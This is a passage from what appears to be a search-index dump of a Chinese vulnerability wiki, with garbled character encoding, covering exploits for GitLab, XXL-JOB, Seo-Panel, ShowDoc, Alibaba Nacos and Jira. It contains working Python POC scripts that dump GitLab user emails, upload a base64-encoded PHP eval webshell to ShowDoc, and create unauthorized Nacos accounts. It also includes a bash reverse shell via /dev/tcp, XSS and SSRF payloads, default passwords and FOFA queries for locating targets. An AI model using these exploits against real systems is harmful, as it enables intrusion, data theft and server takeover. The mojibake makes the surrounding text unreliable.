çš„è¯­å¥åœ¨æ¥å£æŸ¥è¯¢æ—¶ä¼šè¿”å›é‚®ç®±ä¿¡æ¯ï¼Œå¦‚å›¾ è®¿é—® URL http://xxx.xxx.xxx.xxx/-//graphql-explorer Gitlabæœ¬èº«ä¸å…è®¸è·å–è´¦å·é‚®ç®±ä¿¡æ¯ï¼Œè¿™é‡Œé€šè¿‡è°ƒç”¨ Graphql ç”¨æˆ·åæŸ¥è¯¢é€ æˆäº†é‚®ç®±æ³„éœ²æ¼æ´ æŸ¥çœ‹å®ŒæŠ¥å‘Šåå‘ç°æ¼æ´åˆ©ç”¨éœ€è¦æœ‰è´¦å·ç”¨æˆ·åï¼Œåœ¨ä¸çŸ¥é“çš„æƒ…å†µä¸‹æ— æ³•è·å–é‚®ç®±ï¼Œåœ¨Graphqlå®˜ç½‘æŸ¥çœ‹å¾—çŸ¥å¯ä»¥é€šè¿‡å¦ä¸€ä¸ªæ„é€ çš„è¯­å¥ä¸€æ¬¡æ€§è¿”å›æ‰€æœ‰çš„ç”¨æˆ·åå’Œé‚®ç®± å‘åŒ…è°ƒç”¨äº† /api/graphql æ¥å£å‘é€æ•°æ® å®Œæ•´æ•°æ®åŒ…ä¸º POST /api/graphql HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 212 Content-Type: application/json {\"query\":\"{\\nusers {\\nedges {\\n node {\\n username\\n email\\n avatarUrl\\n status {\\n emoji\\n message\\n messageHtml\\n }\\n }\\n }\\n }\\n }\",\"variables\":null,\"operationName\":null} æˆåŠŸè¿”å›æ•°æ®ï¼Œé€ æˆ Gitlabçš„ç”¨æˆ·é‚®ç®±ä¿¡æ¯æ³„éœ² æ¼æ´åˆ©ç”¨POC import requests import sys import random import re import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: GitLab 13.4 - 13.6.2 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/api/graphql\" user_number = 0 headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/json\", } try: data = \"\"\" {\"query\":\"{\\\\nusers {\\\\nedges {\\\\n node {\\\\n username\\\\n email\\\\n avatarUrl\\\\n status {\\\\n emoji\\\\n message\\\\n messageHtml\\\\n }\\\\n }\\\\n }\\\\n }\\\\n }\",\"variables\":null,\"operationName\":null} \"\"\" requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data ,verify=False, timeout=5) if \"email\" in response.text and \"username\" in response.text and \"@\" in response.text and response.status_code == 200: print('\\033[32m[o] ç›®æ ‡{}å­˜åœ¨æ¼æ´, æ³„éœ²ç”¨æˆ·é‚®ç®±æ•°æ®....... \\033[0m'.format(target_url)) for i in range(0,999): try: username = json.loads(response.text)[\"data\"][\"users\"][\"edges\"][i][\"node\"][\"username\"] email = json.loads(response.text)[\"data\"][\"users\"][\"edges\"][i][\"node\"][\"email\"] user_number = user_number + 1 print('\\033[34m[o] ç”¨æˆ·å:{} é‚®ç®±:{} \\033[0m'.format(username, email)) except: print(\"\\033[32m[o] å…±æ³„éœ²{}åç”¨æˆ·é‚®ç®±è´¦å· \\033[0m\".format(user_number)) sys.exit(0) else: print(\"\\033[31m[x] ä¸å­˜åœ¨æ¼æ´ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ GitLab_Graphql_Email_information_disclosure.json PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/GitLab/GitLab SSRFæ¼æ´ CVE-2021-22214.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/GitLab/GitLab SSRFæ¼æ´ CVE-2021-22214.html","title":"GitLab SSRFæ¼æ´ CVE-2021-22214","keywords":"","body":"GitLab SSRFæ¼æ´ CVE-2021-22214 æ¼æ´æè¿° GitLabå­˜åœ¨å‰å°æœªæˆæƒSSRFæ¼æ´ï¼Œæœªæˆæƒçš„æ”»å‡»è€…ä¹Ÿå¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡ŒSSRFæ”»å‡»ï¼ˆCVE-2021-22214ï¼‰ã€‚è¯¥æ¼æ´æºäºå¯¹ç”¨æˆ·æä¾›æ•°æ®çš„éªŒè¯ä¸è¶³ï¼Œè¿œç¨‹æ”»å‡»è€…å¯é€šè¿‡å‘é€ç‰¹æ®Šæ„é€ çš„ HTTP è¯·æ±‚ï¼Œæ¬ºéª—åº”ç”¨ç¨‹åºå‘ä»»æ„ç³»ç»Ÿå‘èµ·è¯·æ±‚ã€‚æ”»å‡»è€…æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯è·å¾—æ•æ„Ÿæ•°æ®çš„è®¿é—®æƒé™æˆ–å‘å…¶ä»–æœåŠ¡å™¨å‘é€æ¶æ„è¯·æ±‚ã€‚ æ¼æ´å½±å“ [!NOTE] Gitlab > 10.5 FOFA [!NOTE] app=\"GitLab\" ç¯å¢ƒæ­å»º http://vulfocus.fofa.so/ æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å‘é€è¯·æ±‚åŒ… POST /api/v4/ci/lint HTTP/1.1 Host: User-Agent: python-requests/2.25.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: application/json Content-Length: 111 {\"include_merged_yaml\": true, \"content\": \"include:\\n remote: http://965qaw.dnslog.cn/api/v1/targets?test.yml\"} PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-27 22:09:03 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/XXL-JOB/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/XXL-JOB/","title":"XXL-JOB","keywords":"","body":"XXL-JOB XXL-JOB ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ åå°é»˜è®¤å¼±å£ä»¤ XXL-JOB ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ åå°ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-17 11:45:57 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/XXL-JOB/XXL-JOB ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ åå°é»˜è®¤å¼±å£ä»¤.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/XXL-JOB/XXL-JOB ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ åå°é»˜è®¤å¼±å£ä»¤.html","title":"XXL-JOB ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ åå°é»˜è®¤å¼±å£ä»¤","keywords":"","body":"XXL-JOB ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ åå°é»˜è®¤å¼±å£ä»¤ æ¼æ´æè¿° XXL-JOB ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ åå°å­˜åœ¨é»˜è®¤å¼±å£ä»¤ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨åå°è¿›ä¸€æ­¥æ”»å‡» æ¼æ´å½±å“ [!NOTE] XXL-JOB FOFA [!NOTE] app=\"XXL-JOB\" || title=\"ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ\" æ¼æ´å¤ç° ä½¿ç”¨é»˜è®¤å£ä»¤ç™»å½• admin 123456 Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ XXL_JOB_Default_password PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/XXL-JOB/XXL-JOB ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ åå°ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/XXL-JOB/XXL-JOB ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ åå°ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"XXL-JOB ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ åå°ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"XXL-JOB ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ åå°ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° XXL-JOB ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒæ”»å‡»è€…å¯ä»¥åœ¨åå°å¯ä»¥é€šè¿‡å†™å…¥shellå‘½ä»¤ä»»åŠ¡è°ƒåº¦è·å–æœåŠ¡å™¨æƒé™ æ¼æ´å½±å“ [!NOTE] XXL-JOB FOFA [!NOTE] app=\"XXL-JOB\" || title=\"ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ\" æ¼æ´å¤ç° ç™»å½•åå°å¢åŠ ä¸€ä¸ªä»»åŠ¡ [!NOTE] æ³¨æ„è¿è¡Œæ¨¡å¼éœ€è¦ä¸º GLUE(shell) ç‚¹å‡» GLUE IDEç¼–è¾‘è„šæœ¬ æ‰§è¡Œæ¢æµ‹å‡ºç½‘ï¼Œå’Œä»»åŠ¡è°ƒç”¨æ˜¯å¦å¯æ‰§è¡Œ åå¼¹ä¸€ä¸ªshell #!/bin/bash bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Seo-Panel/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Seo-Panel/","title":"Seo-Panel","keywords":"","body":"Seo-Panel Seo-Panel 4.8.0 åå°„å‹XSSæ¼æ´ CVE-2021-3002 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-03 12:35:51 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Seo-Panel/Seo-Panel 4.8.0 åå°„å‹XSSæ¼æ´  CVE-2021-3002.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Seo-Panel/Seo-Panel 4.8.0 åå°„å‹XSSæ¼æ´  CVE-2021-3002.html","title":"Seo-Panel 4.8.0 åå°„å‹XSSæ¼æ´  CVE-2021-3002","keywords":"","body":"Seo-Panel 4.8.0 åå°„å‹XSSæ¼æ´ CVE-2021-3002 æ¼æ´æè¿° Seo Panelæ˜¯ä¸€ä¸ªç½‘ç«™æœç´¢å¼•æ“ä¼˜åŒ–ç®¡ç†çš„å®Œæ•´æ§åˆ¶é¢æ¿ã€‚å®ƒåŒ…å«äº†å¤šä¸ªSEOå·¥å…·æ¥å¢åŠ å’Œè·Ÿè¸ªä½ çš„ç½‘ç«™æ€§èƒ½ Seo-Panel 4.8.0ä»¥ä¸‹ç‰ˆæœ¬å­˜åœ¨è¿‡æ»¤ä¸å®Œå…¨çš„æƒ…å†µï¼Œé€ æˆå­˜åœ¨ åå°„å‹XSSæ¼æ´ æ¼æ´å½±å“ [!NOTE] Seo-Panel Version ç¯å¢ƒæ­å»º https://github.com/seopanel/Seo-Panel ä¸‹è½½åæ”¾å…¥ç½‘ç«™æ ¹ç›®å½•æ ¹æ®æç¤ºå®‰è£…è®¿é—®å³å¯ æ¼æ´å¤ç° æ¼æ´å‡ºç°åœ¨æ‰¾å›å¯†ç é¡µé¢ http://xxx.xxx.xxx.xxx/login.php?sec=forgot æˆåŠŸå¼¹çª— ,é€ æˆ åå°„å‹XSS æ¼æ´ æ¼æ´POC è¯·æ±‚åŒ…å¦‚ä¸‹ POST /login.php?sec=forgot HTTP/1.1 Host: 192.168.51.133 Content-Length: 118 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Origin: http://192.168.51.133 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.51.133/login.php?sec=forgot Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=i0qk20ehq89b29ct8krpv76vn3; yzmphp_adminid=33d5DywYQIUGS13SI7x4I0y7JiCacraGcDU1uoBx; yzmphp_adminname=1fc8yAdCyAogZ-PIz4c66dU1ij0mHsG7KGF_5tToVThEzbc Connection: close sec=requestpass&email=peiqi%40peiqi.com%22%3E%3Cimg+src%3Da+onerror%3Dalert%28%22peiqi%22%29%3Egcuak&code=12345&login= PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ShowDoc/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ShowDoc/","title":"ShowDoc","keywords":"","body":"ShowDoc ShowDoc ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-24 12:56:00 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ShowDoc/ShowDoc ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ShowDoc/ShowDoc ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html","title":"ShowDoc ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´","keywords":"","body":"ShowDoc ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ¼æ´æè¿° ShowDoc å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„æ•°æ®åŒ…å¯ä»¥ä¸Šä¼ æ¶æ„æ–‡ä»¶æ§åˆ¶æœåŠ¡å™¨ æ¼æ´å½±å“ [!NOTE] ShowDoc FOFA [!NOTE] app=\"ShowDoc\" æ¼æ´å¤ç° ç½‘ç«™é¦–é¡µå¦‚ä¸‹ æ„é€ å¦‚ä¸‹æ•°æ®åŒ…ä¸Šä¼ phpæ–‡ä»¶ POST /index.php?s=/home/page/uploadImg HTTP/1.1 Host: xxx.xxx.xxx.xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Content-Length: 239 Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617 Accept-Encoding: gzip ----------------------------921378126371623762173617 Content-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.<>php\" Content-Type: text/plain ----------------------------921378126371623762173617-- è®¿é—®å›æ˜¾çš„è·¯å¾„ æ¼æ´POC import requests import sys import random import base64 import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mTitle: ShowDoc ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/index.php?s=/home/page/uploadImg\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\", \"Content-Type\": \"multipart/form-data; boundary=--------------------------921378126371623762173617\" } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTkyMTM3ODEyNjM3MTYyMzc2MjE3MzYxNwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImVkaXRvcm1kLWltYWdlLWZpbGUiOyBmaWxlbmFtZT0idGVzdC48PnBocCIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocCBlY2hvICd0ZXN0X3Rlc3QnO0BldmFsKCRfUE9TVFt0ZXN0XSk/PgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tOTIxMzc4MTI2MzcxNjIzNzYyMTczNjE3LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"success\" in response.text and response.status_code == 200: webshell_url = re.findall(r'\"url\":\"(.*?)\"', response.text)[0] webshell_url = webshell_url.replace('\\\\','') response = requests.get(url=webshell_url, headers=headers,verify=False, timeout=5) if \"test_test\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ ,æˆåŠŸä¸Šä¼ æœ¨é©¬ \\n[o] è·¯å¾„ä¸º {}\\033[0m\".format(target_url, webshell_url)) print(\"\\033[32m[o] å¯†ç ä¸º: peiqi \\033[0m\") else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) else: print(\"\\033[31m[x] ä¸Šä¼ å¤±è´¥ \\033[0m\") except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 20:18:49 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Alibaba Nacos/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Alibaba Nacos/","title":"Alibaba Nacos","keywords":"","body":"Alibaba Nacos Alibaba Nacos æ§åˆ¶å°é»˜è®¤å¼±å£ä»¤ Alibaba Nacos æœªæˆæƒè®¿é—®æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-25 16:47:15 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Alibaba Nacos/Alibaba Nacos æ§åˆ¶å°é»˜è®¤å¼±å£ä»¤.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Alibaba Nacos/Alibaba Nacos æ§åˆ¶å°é»˜è®¤å¼±å£ä»¤.html","title":"Alibaba Nacos æ§åˆ¶å°é»˜è®¤å¼±å£ä»¤","keywords":"","body":"Alibaba Nacos æ§åˆ¶å°é»˜è®¤å¼±å£ä»¤ æ¼æ´æè¿° Alibaba Nacos æ§åˆ¶å°å­˜åœ¨é»˜è®¤å¼±å£ä»¤ nacos/nacosï¼Œå¯ç™»å½•åå°æŸ¥çœ‹æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] Alibaba Nacos æ¼æ´å¤ç° å‘é€å¦‚ä¸‹è¯·æ±‚ è¿”å›200è¯´æ˜æˆåŠŸç™»å½• Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Alibaba_Nacos_Default_password.json PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Alibaba Nacos/Alibaba Nacos æœªæˆæƒè®¿é—®æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Alibaba Nacos/Alibaba Nacos æœªæˆæƒè®¿é—®æ¼æ´.html","title":"Alibaba Nacos æœªæˆæƒè®¿é—®æ¼æ´","keywords":"","body":"Alibaba Nacos æœªæˆæƒè®¿é—®æ¼æ´ æ¼æ´æè¿° 2020å¹´12æœˆ29æ—¥ï¼ŒNacoså®˜æ–¹åœ¨githubå‘å¸ƒçš„issueä¸­æŠ«éœ²Alibaba Nacos å­˜åœ¨ä¸€ä¸ªç”±äºä¸å½“å¤„ç†User-Agentå¯¼è‡´çš„æœªæˆæƒè®¿é—®æ¼æ´ ã€‚é€šè¿‡è¯¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è¿›è¡Œä»»æ„æ“ä½œï¼ŒåŒ…æ‹¬åˆ›å»ºæ–°ç”¨æˆ·å¹¶è¿›è¡Œç™»å½•åæ“ä½œã€‚ æ¼æ´å½±å“ [!NOTE] Nacos FOFA [!NOTE] title=\"Nacos\" ç¯å¢ƒæ­å»º https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1 wget https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1 tar -zxvf nacos-server-2.0.0-ALPHA.1.tar.gz ./startup.sh -m standalone ç„¶åè®¿é—® http://xxx.xxx.xxx.xxx:8848/nacos å³å¯ï¼Œé»˜è®¤è´¦å·å¯†ç  nacos/nacos æ¼æ´å¤ç° å¯ä»¥å†é¡¹ç›®çš„ issues ä¸­çœ‹åˆ°å¤§é‡çš„å…³äºè¶Šæƒçš„å®‰å…¨é—®é¢˜çš„è®¨è®º https://github.com/alibaba/nacos/issues/1105 è¿™é‡Œæˆ‘ä»¬åœ¨ç™»å½•åä»»æ„ä¸€ä¸ªä½ç½®çœ‹ä¸€ä¸‹è¯·æ±‚ï¼Œå¹¶åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹çœ‹æ˜¯å¦å¯ä»¥è®¿é—® è¿™é‡Œçš„è¯·æ±‚urlç®€åŒ–ä¸º http://xxx.xxx.xxx.xxx:8848/nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword= é€€å‡ºç”¨æˆ·ååœ¨å‰å°è®¿é—®è¿™ä¸ª url å¯ä»¥å‘ç°ä»¥åŠæ³„éœ²äº† ipèŠ‚ç‚¹ ç­‰æ•°æ® åŒæ ·æˆ‘ä»¬æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨çš„è¯·æ±‚å¹¶åœ¨å‰å°è®¿é—® http://xxx.xxx.xxx.xxx:8848/nacos/v1/auth/users?pageNo=1&pageSize=9 è¿™é‡Œå¯ä»¥å‘ç°å¯¹ç”¨æˆ·çš„è¯·æ±‚æ˜¯å®Œå…¨æ²¡æœ‰è¿‡æ»¤çš„ï¼Œå¯ä»¥é€šè¿‡æœªæˆæƒçš„æƒ…å†µè·å–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ æˆ‘ä»¬å°è¯•åˆ›å»ºç”¨æˆ·å¹¶æŠ“åŒ… è¿”å›ä¸‹åˆ—åˆ›å»ºæˆåŠŸ {\"code\":200,\"message\":\"create user ok!\",\"data\":null} åŒæ ·çš„æˆ‘ä»¬ç®€åŒ–è¯·æ±‚ POST /nacos/v1/auth/users? username=peiqi&password=peiqi çœ‹åˆ°æœ‰æ–‡ç« è¯´è¦åŠ ä¸ŠUser-Agentè¯·æ±‚å¤´ User-Agent: Nacos-Server ä½†æ˜¯å¤§é‡æµ‹è¯•ä¹‹åå‘ç°å¥½åƒæ˜¯æ— å…³ç´§è¦çš„ï¼Œæ²¡æœ‰è¯·æ±‚å¤´åŒæ ·å¯ä»¥åˆ›å»ºç”¨æˆ· [!NOTE] åŒæ ·çš„åŸç†ä¹Ÿå¯ä»¥ç”¨äºä¿®æ”¹å¯†ç æ·»åŠ é…ç½®ç­‰ æ¼æ´åˆ©ç”¨POC [!NOTE] æ³¨æ„ä¸‹å¤§éƒ¨åˆ†ä¼ä¸šçš„ nacosçš„urlä¸º /v1/auth/users ï¼Œè€Œä¸æ˜¯ /nacos/v1/auth/users å¯ä»¥æŒ‰ç›®æ ‡æƒ…å†µè‡ªè¡Œä¿®æ”¹ import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Nacos >> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): # vuln_url = target_url + \"/nacos/v1/auth/users\" vuln_url = target_url + \"/v1/auth/users\" headers = { \"User-Agent\": \"Nacos-Server\", \"Content-Type\": \"application/x-www-form-urlencoded\", } number = random.randint(0,999) data = \"username=peiqi{}&password=peiqi\".format(str(number)) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] æ­£åœ¨è¯·æ±‚ {}/nacos/v1/auth/users \\033[0m\".format(target_url)) if \"create user ok!\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) print(\"\\033[32m[o] æˆåŠŸåˆ›å»ºè´¦æˆ· peiqi{} peiqi\\033[0m\".format(str(number))) else: print(\"\\033[31m[x] åˆ›å»ºç”¨æˆ·è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Alibaba_Nacos_Add_user_not_authorized.json PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Atlassian Jira/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Atlassian Jira/","title":"Atlassian Jira","keywords":"","body":"Atlassian Jira Atlassian Jira ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-14181 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-29 10:04:35 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Atlassian Jira/Atlassian Jira ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-14181.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Atlassian Jira/Atlassian Jira ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-14181.html","title":"Atlassian Jira ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-14181","keywords":"","body":"Atlassian Jira ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-14181 æ¼æ´æè¿° Jiraå­˜åœ¨ä¸€ä¸ªæœªæˆæƒè®¿é—®æ¼æ´ï¼Œæœªæˆæƒçš„ç”¨æˆ·å¯ä»¥é€šè¿‡ä¸€ä¸ªapiæ¥å£ç›´æ¥æŸ¥è¯¢åˆ°æŸç”¨æˆ·åçš„å­˜åœ¨æƒ…å†µï¼Œè¯¥æ¥å£ä¸åŒäºCVE-2019-8446å’ŒCVE-2019-3403çš„æ¥å£ï¼Œæ˜¯ä¸€ä¸ªæ–°çš„æ¥å£ã€‚å¦‚æœJiraæš´éœ²åœ¨å…¬ç½‘ä¸­ï¼Œæœªæˆæƒç”¨æˆ·å°±å¯ä»¥ç›´æ¥è®¿é—®è¯¥æ¥å£çˆ†ç ´å‡ºæ½œåœ¨çš„ç”¨æˆ·åã€‚ æ¼æ´å½±å“ [!NOTE] Atlassian Jira Atlassian Jira 8.0.0 - 8.5.7 Atlassian Jira 8.6.0 - 8.12.0 FOFA [!NOTE] app=\"Jira\" æ¼æ´å¤ç° æ‰“å¼€ä¸»ç•Œé¢ï¼Œæ³¨æ„æ ‡è¯†ä¸­çš„ Jiraç‰ˆæœ¬æ˜¯å¦åœ¨å½±å“ä¸­ ä½¿ç”¨POCå¯¹ç”¨æˆ·åæ˜¯å¦å­˜åœ¨è¿›è¡ŒéªŒè¯ 